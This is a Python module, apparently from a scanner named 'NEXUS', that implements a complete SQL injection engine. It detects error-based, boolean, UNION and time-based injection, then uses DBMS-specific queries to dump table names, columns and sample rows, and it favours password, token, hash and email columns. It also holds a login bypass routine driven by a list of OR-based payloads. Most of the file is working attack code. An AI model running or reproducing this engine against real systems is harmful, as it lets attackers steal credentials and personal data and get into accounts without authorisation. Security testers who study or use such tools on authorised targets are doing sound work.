"""
SQLi Engine — SQLMap-equivalent written in pure Python.

Implements detection techniques E / B / U / T with strict
anti-hallucination canary confirmation for every finding.

  Technique E  — Error-based : DB error message in response
  Technique B  — Boolean-blind: TRUE response differs from FALSE response
  Technique U  — UNION-based : canary sentinel appears in response
  Technique T  — Time-based  : measured delay > baseline × threshold (3 samples)

Data extraction (DBMS-aware):
  SQLite   : sqlite_master, sqlite_version()
  MySQL    : information_schema, version(), database()
  PostgreSQL: pg_catalog, version(), current_database()
  MSSQL    : sysobjects, @@version, DB_NAME()

Anti-hallucination rules:
  E  — error string must match compiled pattern (≥1 of 18 DB error regexes)
  B  — true/false responses must differ in body length OR status code
  U  — unique UUID canary must appear verbatim in response
  T  — 3 independent samples, all ≥ baseline + delay×0.85; server jitter filtered
"""
from __future__ import annotations

import asyncio
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx


# ---------------------------------------------------------------------------
# DB Error Signatures
# ---------------------------------------------------------------------------

_DB_ERRORS: list[tuple[re.Pattern, str]] = [
    # MySQL — DVWA (low.php: mysqli_error() shown), also WebGoat MySQL
    (re.compile(r"SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxError|com\.mysql\.jdbc"
                r"|You have an error in your SQL syntax"
                r"|Operand should contain \d+ column"
                r"|mysqli_fetch_array\(\)"
                r"|supplied argument is not a valid MySQL",  re.I), "MySQL"),
    # Oracle
    (re.compile(r"ORA-\d{5}|Oracle error|quoted string not properly terminated"
                r"|PLS-\d{5}|ora-\d{4}",          re.I), "Oracle"),
    # MSSQL
    (re.compile(r"Microsoft OLE DB.*ODBC|\[SQL Server\]|Unclosed quotation"
                r"|Incorrect syntax near|Conversion failed when converting"
                r"|SqlException|ODBC SQL Server Driver", re.I), "MSSQL"),
    # PostgreSQL — also Sequelize/pg errors from DVNA, NodeGoat
    (re.compile(r"PostgreSQL.*ERROR|PG::SyntaxError|org\.postgresql"
                r"|ERROR:\s+syntax error at or near"
                r"|SequelizeDatabaseError.*syntax error"
                r"|column .* does not exist"
                r"|unterminated quoted string at or near", re.I), "PostgreSQL"),
    # SQLite — Juice Shop (next(error.parent) propagates raw SQLite error as 500)
    (re.compile(r"SQLite\.Exception|System\.Data\.SQLite|Warning.*sqlite_"
                r"|unrecognized token:|SQLITE_ERROR"
                r"|near [\"'].*[\"']: syntax error"
                r"|sqlite3\.OperationalError"
                r"|SQLITE_CONSTRAINT"
                r"|no such column:"
                r"|no such table:"
                r"|incomplete input",                re.I), "SQLite"),
    # IBM DB2 — Altoro Mutual (testfire.net), many enterprise Java apps
    (re.compile(r"CLI Driver|DB2/NT|DB2/LINUX|DB2/AIX"
                r"|SQL\d+N\s"
                r"|com\.ibm\.db2"
                r"|db2jcc"
                r"|SQLSTATE\[IX"
                r"|unclosed quotation mark.*DB2"
                r"|DB2 SQL error",  re.I), "DB2"),
    # Generic / framework-level (Express error handler, Flask, Spring)
    (re.compile(r"syntax error.*near|unterminated string literal"
                r"|org\.hibernate\.exception|Caused by.*SQLException"
                r"|JDBCException|HibernateException"
                r"|java\.sql\.SQLException"
                r"|PG::UndefinedColumn"
                r"|ActiveRecord::StatementInvalid",  re.I), "SQL-generic"),
]


def detect_db_error(text: str) -> Optional[str]:
    """Return DBMS name if a DB error is found in *text*, else None."""
    for pattern, dbms in _DB_ERRORS:
        if pattern.search(text):
            return dbms
    return None


# ---------------------------------------------------------------------------
# Payload Templates (DBMS-aware extraction)
# ---------------------------------------------------------------------------

# UNION column count detection payloads
_UNION_PROBE_TEMPLATES = [
    # Most common: single-quote close + comment (MySQL, MSSQL, SQLite)
    "' UNION SELECT {cols}--",
    "' UNION SELECT {cols}-- -",
    # Parenthesis variant (ORMs/Sequelize/Java)
    "') UNION SELECT {cols}--",
    # Double-paren (Juice Shop, complex WHERE clauses)
    "')) UNION SELECT {cols}--",
    # Double-quote contexts (some SQLite apps)
    '" UNION SELECT {cols}--',
    # Hash comment (MySQL)
    "' UNION SELECT {cols}#",
]

# Boolean TRUE/FALSE payloads — the injected conditions are always deterministic
_BOOL_TRUE_PAYLOADS = [
    "' AND '1'='1",
    "' AND 1=1--",
    "') AND ('1'='1",
    '" AND "1"="1',
    "' AND 1=1-- -",
    # Integer-context payloads (appended to numeric values like id=1)
    " AND 1=1--",
    " AND 1=1-- -",
]
_BOOL_FALSE_PAYLOADS = [
    "' AND '1'='2",
    "' AND 1=2--",
    "') AND ('1'='2",
    '" AND "1"="2',
    "' AND 1=2-- -",
    # Integer-context payloads
    " AND 1=2--",
    " AND 1=2-- -",
]

# Time payloads — each expects *delay* seconds of added latency
_TIME_PAYLOADS: list[tuple[str, float, str]] = [
    ("' AND SLEEP({delay})-- -",            4.0, "MySQL"),
    ("') AND SLEEP({delay})-- -",           4.0, "MySQL"),
    ("'; WAITFOR DELAY '0:0:{delay}'-- -",  4.0, "MSSQL"),
    ("' OR pg_sleep({delay})-- -",          4.0, "PostgreSQL"),
    ("') OR pg_sleep({delay})-- -",         4.0, "PostgreSQL"),
    ("' AND 1=1 AND SLEEP({delay})-- -",    4.0, "MySQL"),
]

# Data extraction templates per DBMS
_EXTRACT_TEMPLATES = {
    "SQLite": {
        "version":  "SELECT sqlite_version()",
        "tables":   "SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'",
        "columns":  "SELECT group_concat(name,',') FROM pragma_table_info('{table}')",
        "dump":     "SELECT group_concat({cols},',') FROM {table} LIMIT {limit}",
    },
    "MySQL": {
        "version":  "SELECT version()",
        "tables":   "SELECT group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
        "columns":  "SELECT group_concat(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='{table}'",
        "dump":     "SELECT group_concat(concat_ws(':',{cols}) SEPARATOR '||') FROM {table} LIMIT {limit}",
    },
    "PostgreSQL": {
        "version":  "SELECT version()",
        "tables":   "SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'",
        "columns":  "SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
        "dump":     "SELECT string_agg({cols}::text,'||') FROM {table} LIMIT {limit}",
    },
    "MSSQL": {
        "version":  "SELECT @@version",
        "tables":   "SELECT STUFF((SELECT ','+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,'')",
        "columns":  "SELECT STUFF((SELECT ','+name FROM syscolumns WHERE id=OBJECT_ID('{table}') FOR XML PATH('')),1,1,'')",
        "dump":     "SELECT TOP {limit} {cols} FROM {table}",
    },
}


# ---------------------------------------------------------------------------
# Injection helper
# ---------------------------------------------------------------------------

async def _inject(
    client: httpx.AsyncClient,
    ip_url: str,
    ip_method: str,
    ip_type: str,
    param_name: str,
    payload: str,
    extra_headers: dict | None = None,
) -> Optional[httpx.Response]:
    """Send a single injection request and return the response."""
    headers = extra_headers or {}
    try:
        if ip_type == "QUERY_PARAM":
            parsed = urlparse(ip_url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param_name] = [payload]
            q = urlencode({k: v[0] for k, v in params.items()}, quote_via=lambda s, *_: s)
            url = urlunparse(parsed._replace(query=q))
            return await client.request(ip_method, url, headers=headers)

        elif ip_type == "BODY_PARAM":
            return await client.post(ip_url, data={param_name: payload}, headers=headers)

        elif ip_type == "JSON_KEY":
            headers["Content-Type"] = "application/json"
            return await client.post(ip_url, json={param_name: payload}, headers=headers)

        elif ip_type == "COOKIE":
            headers["Cookie"] = f"{param_name}={payload}"
            return await client.request(ip_method, ip_url, headers=headers)

    except Exception:
        pass
    return None


def _build_union_cols(n: int, canary_pos: int = 1, canary: str = "NEXUS_CANARY") -> str:
    """Build UNION column list of width *n* with canary at *canary_pos*."""
    cols = []
    for i in range(1, n + 1):
        cols.append(f"'{canary}'" if i == canary_pos else str(i))
    return ",".join(cols)


def _build_injection_url(ip_url: str, param_name: str, payload: str) -> str:
    parsed = urlparse(ip_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    q = urlencode({k: v[0] for k, v in params.items()}, quote_via=lambda s, *_: s)
    return urlunparse(parsed._replace(query=q))


# ---------------------------------------------------------------------------
# SQLi Engine
# ---------------------------------------------------------------------------

@dataclass
class SqliResult:
    """Result from SQLi engine — all fields are None if not confirmed."""
    technique: str = ""           # "E", "B", "U", "T"
    dbms: str = ""
    confirmed: bool = False
    confidence: str = "TENTATIVE" # CERTAIN / FIRM / TENTATIVE
    winning_payload: str = ""
    canary_proof: str = ""        # the string found in response proving injection
    db_version: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    sample_rows: list[dict] = field(default_factory=dict)
    union_col_count: int = 0
    poc_payload: str = ""         # ready-to-use payload
    raw_response_snippet: str = ""
    # ── Full HTTP evidence (populated so checks can build proper PoCs) ────────
    attack_response: Optional["httpx.Response"] = None   # the response that confirmed the vuln
    baseline_response: Optional["httpx.Response"] = None # benign baseline for comparison
    attack_request_raw: str = ""  # formatted HTTP/1.1 request text


class SqliEngine:
    """
    Full SQL injection detection + exploitation engine.

    Usage:
        engine = SqliEngine()
        result = await engine.test(client, ip)
        if result.confirmed:
            data = await engine.extract(client, ip, result)
    """

    MAX_UNION_COLS = 8
    TIME_DELAY = 4
    TIME_SAMPLES = 3
    TIME_MIN_FACTOR = 0.85

    async def test(
        self,
        client: httpx.AsyncClient,
        ip_url: str,
        ip_method: str,
        ip_type: str,
        param_name: str,
        original_value: str = "test",
        auth_headers: dict | None = None,
    ) -> SqliResult:
        """
        Run all techniques (E → U → B → T) and return the first confirmed result.
        Faster techniques run first; time-based is last (slowest).
        """
        result = SqliResult()

        # E — Error-based (fastest, most certain)
        r_e = await self._test_error(client, ip_url, ip_method, ip_type, param_name, auth_headers)
        if r_e.confirmed:
            return r_e

        # U — UNION-based (confirms data extraction)
        r_u = await self._test_union(client, ip_url, ip_method, ip_type, param_name, auth_headers)
        if r_u.confirmed:
            return r_u

        # B — Boolean-based blind
        r_b = await self._test_boolean(client, ip_url, ip_method, ip_type, param_name, original_value, auth_headers)
        if r_b.confirmed:
            return r_b

        # T — Time-based blind (slowest, run last)
        r_t = await self._test_time(client, ip_url, ip_method, ip_type, param_name, auth_headers)
        if r_t.confirmed:
            return r_t

        return result

    # ------------------------------------------------------------------
    # Technique E: Error-based
    # ------------------------------------------------------------------

    async def _test_error(
        self, client, url, method, ip_type, param, auth_headers,
    ) -> SqliResult:
        result = SqliResult(technique="E")
        error_payloads = ["'", "''", "`", '"', "\\", "' OR '1'='1", "'--", "';--"]

        for payload in error_payloads:
            resp = await _inject(client, url, method, ip_type, param, payload, auth_headers)
            if resp is None:
                continue
            dbms = detect_db_error(resp.text)
            if dbms:
                result.confirmed = True
                result.confidence = "CERTAIN"
                result.dbms = dbms
                result.winning_payload = payload
                result.canary_proof = _extract_error_snippet(resp.text)
                result.raw_response_snippet = resp.text[:500]
                result.attack_response = resp

                # Try a second payload to double-confirm
                confirm_payload = "' AND 1=CONVERT(int,'a')--" if dbms == "MSSQL" else "' AND extractvalue(1,concat(0x7e,version()))--"
                r2 = await _inject(client, url, method, ip_type, param, confirm_payload, auth_headers)
                if r2 and detect_db_error(r2.text):
                    result.confidence = "CERTAIN"  # Double confirmed
                return result
        return result

    # ------------------------------------------------------------------
    # Technique B: Boolean-blind
    # ------------------------------------------------------------------

    async def _test_boolean(
        self, client, url, method, ip_type, param, original_value, auth_headers,
    ) -> SqliResult:
        result = SqliResult(technique="B")

        # Baseline: clean request
        r_base = await _inject(client, url, method, ip_type, param, original_value, auth_headers)
        if r_base is None:
            return result

        result.baseline_response = r_base
        baseline_len = len(r_base.text)
        baseline_status = r_base.status_code

        for true_p, false_p in zip(_BOOL_TRUE_PAYLOADS, _BOOL_FALSE_PAYLOADS):
            r_true = await _inject(client, url, method, ip_type, param,
                                   original_value + true_p, auth_headers)
            r_false = await _inject(client, url, method, ip_type, param,
                                    original_value + false_p, auth_headers)
            if r_true is None or r_false is None:
                continue

            len_true = len(r_true.text)
            len_false = len(r_false.text)
            status_diff = r_true.status_code != r_false.status_code
            len_diff = abs(len_true - len_false) > 50

            if status_diff or len_diff:
                # Verify: true response resembles baseline more than false
                len_true_vs_base = abs(len_true - baseline_len)
                len_false_vs_base = abs(len_false - baseline_len)

                if len_true_vs_base < len_false_vs_base or status_diff:
                    # Re-run both 2× to eliminate flakiness
                    confirm_true = await _inject(client, url, method, ip_type, param,
                                                  original_value + true_p, auth_headers)
                    confirm_false = await _inject(client, url, method, ip_type, param,
                                                   original_value + false_p, auth_headers)
                    if confirm_true and confirm_false:
                        c_diff = abs(len(confirm_true.text) - len(confirm_false.text)) > 50
                        c_status = confirm_true.status_code != confirm_false.status_code
                        if c_diff or c_status:
                            result.confirmed = True
                            result.confidence = "FIRM"
                            result.winning_payload = true_p
                            result.canary_proof = (
                                f"TRUE payload len={len_true}, FALSE payload len={len_false}, "
                                f"diff={abs(len_true-len_false)} bytes"
                            )
                            result.poc_payload = (
                                f"TRUE: {original_value + true_p!r}\n"
                                f"FALSE: {original_value + false_p!r}"
                            )
                            result.attack_response = r_true
                            return result
        return result

    # ------------------------------------------------------------------
    # Technique U: UNION-based
    # ------------------------------------------------------------------

    # Math expression whose result can ONLY appear if SQL was executed.
    # Payload contains "10007*10037", response must contain "100481059".
    # A server that echoes the param value shows "10007*10037", never the product.
    _MATH_CANARY_EXPR  = "10007*10037"
    _MATH_CANARY_RESULT = str(10007 * 10037)   # "100481059"

    async def _test_union(
        self, client, url, method, ip_type, param, auth_headers,
    ) -> SqliResult:
        result = SqliResult(technique="U")

        # ── Pre-flight: probe with the math result as a plain value ──────────
        # If the server reflects param values in its response (search echo, 404 page, etc.)
        # then _MATH_CANARY_RESULT would appear even without SQLi.
        preflight = await _inject(
            client, url, method, ip_type, param,
            self._MATH_CANARY_RESULT, auth_headers,
        )
        if preflight and self._MATH_CANARY_RESULT in preflight.text:
            # Server reflects any value → math canary would be a false positive.
            # Fall back to UUID string canary but only accept CERTAIN if math also confirmed.
            math_canary_safe = False
        else:
            math_canary_safe = True

        # String canary for fallback (only used when math canary is ambiguous)
        str_canary = f"NEXUS{uuid.uuid4().hex[:8].upper()}"
        # Pre-flight for string canary
        str_preflight = await _inject(
            client, url, method, ip_type, param, str_canary, auth_headers,
        )
        str_canary_reflected = bool(
            str_preflight and str_canary in str_preflight.text
        )

        for template in _UNION_PROBE_TEMPLATES:
            for col_count in range(1, self.MAX_UNION_COLS + 1):
                # ── Primary probe: math expression ───────────────────────────
                math_cols = []
                for i in range(1, col_count + 1):
                    math_cols.append(
                        f"({self._MATH_CANARY_EXPR})" if i == 1 else str(i)
                    )
                math_payload = template.format(cols=",".join(math_cols))
                resp = await _inject(
                    client, url, method, ip_type, param, math_payload, auth_headers
                )
                if resp and self._MATH_CANARY_RESULT in resp.text and math_canary_safe:
                    # CONFIRMED via arithmetic — cannot be URL/value reflection
                    result.confirmed   = True
                    result.confidence  = "CERTAIN"
                    result.technique   = "U"
                    result.winning_payload    = math_payload
                    result.canary_proof       = (
                        f"SQL arithmetic {self._MATH_CANARY_EXPR}="
                        f"{self._MATH_CANARY_RESULT} returned in response"
                    )
                    result.union_col_count    = col_count
                    result.raw_response_snippet = resp.text[:500]
                    result.dbms = detect_db_error(resp.text) or "unknown"
                    result.poc_payload = math_payload
                    result.attack_response = resp
                    # Try version extraction now we know the template + col count
                    result = await self._enrich_union(
                        result, client, url, method, ip_type, param,
                        template, col_count, auth_headers,
                    )
                    return result

                # ── Fallback: string canary (only if not reflected plainly) ──
                if not str_canary_reflected:
                    str_cols = _build_union_cols(col_count, canary_pos=1, canary=str_canary)
                    str_payload = template.format(cols=str_cols)
                    resp2 = await _inject(
                        client, url, method, ip_type, param, str_payload, auth_headers
                    )
                    if resp2 and str_canary in resp2.text:
                        # Secondary confirmation: inject a second distinct canary
                        # to prove it wasn't a lucky cache/echo hit
                        str_canary2 = f"NEXUS{uuid.uuid4().hex[:8].upper()}"
                        str_cols2 = _build_union_cols(col_count, canary_pos=1, canary=str_canary2)
                        str_payload2 = template.format(cols=str_cols2)
                        resp3 = await _inject(
                            client, url, method, ip_type, param, str_payload2, auth_headers
                        )
                        if resp3 and str_canary2 in resp3.text:
                            result.confirmed   = True
                            result.confidence  = "FIRM"   # FIRM not CERTAIN without math proof
                            result.technique   = "U"
                            result.winning_payload    = str_payload
                            result.canary_proof       = (
                                f"Two distinct string canaries ({str_canary[:8]}, "
                                f"{str_canary2[:8]}) both returned — consistent UNION injection"
                            )
                            result.union_col_count    = col_count
                            result.raw_response_snippet = (resp2.text if resp2 else "")[:500]
                            result.dbms = detect_db_error(
                                (resp2.text if resp2 else "")
                            ) or "unknown"
                            result.poc_payload = str_payload
                            result = await self._enrich_union(
                                result, client, url, method, ip_type, param,
                                template, col_count, auth_headers,
                            )
                            return result
        return result

    async def _enrich_union(
        self, result: "SqliResult",
        client, url, method, ip_type, param,
        template, col_count, auth_headers,
    ) -> "SqliResult":
        """Try to detect DBMS and extract DB version after UNION is confirmed."""
        for version_sql in (
            "SELECT sqlite_version()", "SELECT version()",
            "SELECT @@version", "SELECT banner FROM v$version WHERE ROWNUM=1",
        ):
            v = await self._extract_value(
                client, url, method, ip_type, param,
                template, col_count, version_sql, auth_headers,
            )
            if v:
                result.db_version = v
                # Infer DBMS from version string if not already set
                if result.dbms == "unknown":
                    vl = v.lower()
                    if "sqlite" in vl:         result.dbms = "SQLite"
                    elif "mysql" in vl:        result.dbms = "MySQL"
                    elif "postgresql" in vl:   result.dbms = "PostgreSQL"
                    elif "microsoft sql" in vl: result.dbms = "MSSQL"
                break
        return result

    async def _extract_value(
        self, client, url, method, ip_type, param,
        union_template, col_count, extract_sql, auth_headers,
        marker: str = "NEXUSVAL",
    ) -> str:
        """Extract a single value using UNION injection."""
        try:
            cols = []
            for i in range(1, col_count + 1):
                if i == 1:
                    cols.append(f"({extract_sql})")
                else:
                    cols.append(str(i))
            payload = union_template.format(cols=",".join(cols))
            resp = await _inject(client, url, method, ip_type, param, payload, auth_headers)
            if resp:
                # Try to parse any quoted value from JSON or raw text
                m = re.search(r'"([^"]{2,200})"', resp.text)
                if m and not m.group(1).isdigit():
                    return m.group(1)
        except Exception:
            pass
        return ""

    # ------------------------------------------------------------------
    # Technique T: Time-based blind
    # ------------------------------------------------------------------

    async def _test_time(
        self, client, url, method, ip_type, param, auth_headers,
    ) -> SqliResult:
        result = SqliResult(technique="T")

        # Measure baseline — 3 samples, use max to be conservative
        baseline = await self._measure_baseline(client, url, method, ip_type, param, auth_headers)
        if baseline is None:
            return result

        delay = self.TIME_DELAY

        for template, _, dbms_hint in _TIME_PAYLOADS:
            payload = template.format(delay=delay)
            samples: list[float] = []

            for _ in range(self.TIME_SAMPLES):
                t0 = time.monotonic()
                resp = await _inject(client, url, method, ip_type, param, payload, auth_headers)
                elapsed = time.monotonic() - t0
                if resp is not None:
                    samples.append(elapsed)

            if not samples:
                continue

            # All samples must exceed threshold (prevents single-sample fluke)
            min_required = baseline + delay * self.TIME_MIN_FACTOR
            confirmed_samples = [s for s in samples if s >= min_required]

            if len(confirmed_samples) >= max(1, len(samples) // 2 + 1):
                # Re-verify with SLEEP(0) — server should respond fast
                t0 = time.monotonic()
                await _inject(client, url, method, ip_type, param,
                               template.format(delay=0), auth_headers)
                fast_elapsed = time.monotonic() - t0

                if fast_elapsed < baseline + 1.0:  # Fast response confirms it's not just server slowness
                    result.confirmed = True
                    result.confidence = "FIRM"
                    result.dbms = dbms_hint
                    result.winning_payload = payload
                    result.canary_proof = (
                        f"Avg delay with SLEEP({delay}): {sum(samples)/len(samples):.2f}s "
                        f"vs baseline {baseline:.2f}s. "
                        f"SLEEP(0) returned in {fast_elapsed:.2f}s."
                    )
                    result.poc_payload = payload
                    return result

        return result

    async def _measure_baseline(
        self, client, url, method, ip_type, param, auth_headers,
    ) -> Optional[float]:
        times = []
        for _ in range(3):
            t0 = time.monotonic()
            r = await _inject(client, url, method, ip_type, param, "safe_baseline_value", auth_headers)
            elapsed = time.monotonic() - t0
            if r is not None:
                times.append(elapsed)
        return max(times) if times else None

    # ------------------------------------------------------------------
    # Data extraction post-confirmation
    # ------------------------------------------------------------------

    async def extract(
        self,
        client: httpx.AsyncClient,
        ip_url: str,
        ip_method: str,
        ip_type: str,
        param_name: str,
        result: SqliResult,
        auth_headers: dict | None = None,
        max_tables: int = 10,
        max_rows: int = 5,
    ) -> SqliResult:
        """
        After confirming SQLi, extract DB structure and sample data.
        Only works for UNION-based technique; others get limited info.
        """
        if not result.confirmed or result.technique != "U":
            return result

        dbms = result.dbms or "SQLite"
        templates = _EXTRACT_TEMPLATES.get(dbms, _EXTRACT_TEMPLATES["SQLite"])
        union_template = _UNION_PROBE_TEMPLATES[0]  # Use most reliable template
        col_count = result.union_col_count

        # Extract tables
        tables_raw = await self._extract_value(
            client, ip_url, ip_method, ip_type, param_name,
            union_template, col_count, templates["tables"], auth_headers,
        )
        if tables_raw:
            result.tables = [t.strip() for t in tables_raw.split(",") if t.strip()][:max_tables]

        # Extract columns for each table
        for table in result.tables[:5]:
            col_sql = templates["columns"].replace("{table}", table)
            cols_raw = await self._extract_value(
                client, ip_url, ip_method, ip_type, param_name,
                union_template, col_count, col_sql, auth_headers,
            )
            if cols_raw:
                result.columns[table] = [c.strip() for c in cols_raw.split(",") if c.strip()]

        # Sample data from sensitive-looking tables
        for table in result.tables[:3]:
            cols = result.columns.get(table, [])
            if not cols:
                continue
            # Prefer email/password/user columns
            priority_cols = [c for c in cols if any(k in c.lower() for k in ("email", "password", "token", "hash", "role", "user", "name"))]
            sample_cols = (priority_cols or cols)[:4]
            dump_sql = templates["dump"].replace("{table}", table)\
                                        .replace("{cols}", ",".join(sample_cols))\
                                        .replace("{limit}", str(max_rows))
            rows_raw = await self._extract_value(
                client, ip_url, ip_method, ip_type, param_name,
                union_template, col_count, dump_sql, auth_headers,
            )
            if rows_raw:
                result.sample_rows[table] = rows_raw[:500]

        return result


# ---------------------------------------------------------------------------
# Auth Bypass — OR-based login bypass
# ---------------------------------------------------------------------------

_AUTH_BYPASS_PAYLOADS = [
    ("' OR 1=1--",            "classic OR bypass"),
    ("' OR '1'='1",           "string comparison bypass"),
    ("admin'--",              "admin comment bypass"),
    ("' OR 1=1#",             "MySQL hash comment"),
    ("') OR ('1'='1",         "paren bypass"),
    ('\\" OR \\"1\\"=\\"1',   "double-quote bypass"),
    ("1' OR '1'='1'-- -",     "suffix bypass"),
    ("' OR 1=1 LIMIT 1--",    "LIMIT bypass"),
    ("' OR TRUE--",           "TRUE bypass"),
    ("') OR TRUE--",          "TRUE paren bypass"),
]


async def test_auth_bypass(
    client: httpx.AsyncClient,
    login_url: str,
    user_field: str,
    pass_field: str,
    success_indicators: tuple[str, ...] = ("token", "authentication", "access_token", "bearer"),
    auth_headers: dict | None = None,
) -> Optional[tuple[str, str, httpx.Response]]:
    """
    Try SQL auth bypass payloads on a login endpoint.
    Returns (payload, desc, response) if bypass succeeds, else None.

    Detects success via:
    1. HTTP 200 + token/auth keyword in body (JSON API login)
    2. Redirect to a different URL (form-based login)
    3. Significant response-body difference from baseline (generic)
    """
    # Build baseline: failed login response
    noise_user = f"nexus_{uuid.uuid4().hex[:8]}@invalid.test"
    noise_post_form = {user_field: noise_user, pass_field: "wrongpassword123!"}
    noise_post_json = {user_field: noise_user, pass_field: "wrongpassword123!"}
    try:
        baseline_form = await client.post(login_url, data=noise_post_form,
                                          headers={**(auth_headers or {})},
                                          follow_redirects=True)
        baseline_json = await client.post(login_url, json=noise_post_json,
                                          headers={**(auth_headers or {}), "Content-Type": "application/json"},
                                          follow_redirects=True)
    except Exception:
        return None

    for payload, desc in _AUTH_BYPASS_PAYLOADS:
        # Try form-encoded POST (classic web apps: testfire, DVWA, etc.)
        try:
            resp_form = await client.post(
                login_url,
                data={user_field: payload, pass_field: "x"},
                headers={**(auth_headers or {})},
                follow_redirects=True,
            )
            # Success via redirect to different page
            if resp_form.url != baseline_form.url and str(resp_form.url) != login_url:
                return payload, desc + " (form-redirect)", resp_form
            # Success via body token indicators
            if any(ind in resp_form.text.lower() for ind in success_indicators):
                if not any(ind in baseline_form.text.lower() for ind in success_indicators):
                    return payload, desc + " (form-body)", resp_form
            # Success via significantly different response body (login vs error page)
            if (len(resp_form.text) > 500 and
                    abs(len(resp_form.text) - len(baseline_form.text)) > 1000 and
                    resp_form.status_code in (200, 302)):
                # Verify with second payload to reduce FP
                try:
                    resp2 = await client.post(login_url, data={user_field: "' OR '1'='1", pass_field: "x"},
                                              headers={**(auth_headers or {})}, follow_redirects=True)
                    if abs(len(resp2.text) - len(baseline_form.text)) > 1000:
                        return payload, desc + " (form-length-diff)", resp_form
                except Exception:
                    pass
        except Exception:
            pass

        # Try JSON POST (API-style login)
        try:
            resp_json = await client.post(
                login_url,
                json={user_field: payload, pass_field: "x"},
                headers={**(auth_headers or {}), "Content-Type": "application/json"},
            )
            if resp_json.status_code == 200:
                body_lower = resp_json.text.lower()
                if any(ind in body_lower for ind in success_indicators):
                    if not any(ind in baseline_json.text.lower() for ind in success_indicators):
                        return payload, desc + " (json)", resp_json
        except Exception:
            continue
    return None


# ---------------------------------------------------------------------------
# Helper: extract DB error snippet from response
# ---------------------------------------------------------------------------

def _extract_error_snippet(text: str, max_len: int = 200) -> str:
    """Extract the most relevant DB error snippet from response text."""
    for pattern, _ in _DB_ERRORS:
        m = pattern.search(text)
        if m:
            start = max(0, m.start() - 20)
            end = min(len(text), m.end() + 100)
            return text[start:end].strip()
    return text[:max_len]
